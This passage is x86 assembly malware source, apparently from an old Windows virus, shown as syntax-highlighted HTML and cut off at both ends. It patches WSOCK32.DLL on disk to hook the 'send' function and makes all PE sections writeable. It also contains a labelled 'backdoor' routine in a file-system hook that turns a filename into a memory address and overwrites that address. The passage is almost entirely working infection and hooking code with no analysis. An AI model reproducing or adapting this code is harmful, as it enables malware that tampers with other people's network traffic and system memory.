       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'23KC'</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@shit</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc13">'OSW\'
</span><span class="sc0">       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@shit</span><span class="sc0">
     </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">obufer</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                 </span><span class="sc1">;stack frame</span><span class="sc0">
</span><span class="sc5">header</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">obufer</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc0">
</span><span class="sc5">pe_hdr</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc9">section</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">pe_hdr</span><span class="sc4">+</span><span class="sc2">0f8h</span><span class="sc0">
</span><span class="sc9">export</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">section</span><span class="sc4">+</span><span class="sc2">200h</span><span class="sc0">
</span><span class="sc5">vofs</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">export</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">vraw</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">vofs</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">etable</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">vraw</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">wsize1</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">etable</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">20</span><span class="sc4">)</span><span class="sc0">

       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">wsize1</span><span class="sc0">                        </span><span class="sc1">;patch WSOCK32.DLL...</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">open</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@@error0</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getsize</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">check_size</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@error1</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">obufer</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">obufer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@error1</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0f8h</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">@@error1</span><span class="sc0">                            </span><span class="sc1">;point outside of the file?</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">pe_hdr</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@@error1</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">check_file</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@error1</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">                              </span><span class="sc1">;write pe header</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc9">section</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">                               </span><span class="sc1">;read section table</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
  </span><span class="sc5">@@writeable</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">bts</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">31</span><span class="sc0">                    </span><span class="sc1">;make all sections writeable</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">40</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@@writeable</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0c0000040h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;increase last section</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">vraw</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                   </span><span class="sc1">;raw of our patch</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">vofs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;rva of our patch</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">pend</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">pstart</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">@@fit</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">pe_hdr</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">;align</span><span class="sc0">
  </span><span class="sc5">@@fit</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc9">section</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">pe_hdr</span><span class="sc4">+</span><span class="sc2">120</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;eax=export table</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rva2raw</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">28</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc9">export</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">                               </span><span class="sc1">;read export table addresses</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rva2raw</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">20</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">etable</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;read 20 exports</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">vofs</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">pe_hdr</span><span class="sc4">+</span><span class="sc2">52</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;wsock32 base</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">pstart</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">18</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">;hook send</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">oldsend</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_send</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">vraw</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">pend</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">pstart</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">pstart</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">                              </span><span class="sc1">;write our patch</span><span class="sc0">
  </span><span class="sc5">@@error1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">
  </span><span class="sc5">@@error0</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wsize1</span><span class="sc0">

  </span><span class="sc5">@@shit</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wsize2</span><span class="sc0">                         </span><span class="sc1">;release tmp buffer</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">jmpcc</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc2">0850fh</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">

  </span><span class="sc5">@@noopen</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;total=6 paramz</span><span class="sc0">
  </span><span class="sc5">@@nparam</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;copy paramz from old frame</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;to new frame</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@@nparam</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">                                 </span><span class="sc1">;mov eax, ?</span><span class="sc0">
  </span><span class="sc5">oldhook</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                              </span><span class="sc1">;call old hookz</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

  </span><span class="sc5">backdoor</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@closed</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@delta</span><span class="sc0">
  </span><span class="sc5">@@delta</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">my_send</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">@@delta</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">my_send</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">backdoor</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">@@closed</span><span class="sc4">-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">backdoor</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">))*</span><span class="sc2">100h</span><span class="sc4">)+</span><span class="sc2">0ebh</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;ioreq</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">                                    </span><span class="sc1">;c:\_</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">@@byte</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">                                   </span><span class="sc1">;get filename char</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                               </span><span class="sc1">;build address</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@doneb</span><span class="sc0">
       </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@byte</span><span class="sc0">
  </span><span class="sc5">@@doneb</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                          </span><span class="sc1">;patch requested address</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
  </span><span class="sc5">@@closed</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">leave</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">hook</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">delta</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@delta</span><span class="sc0">
  </span><span class="sc5">@@delta</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">@@delta</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">check_file</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">14ch</span><span class="sc0">                    </span><span class="sc1">;386</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">
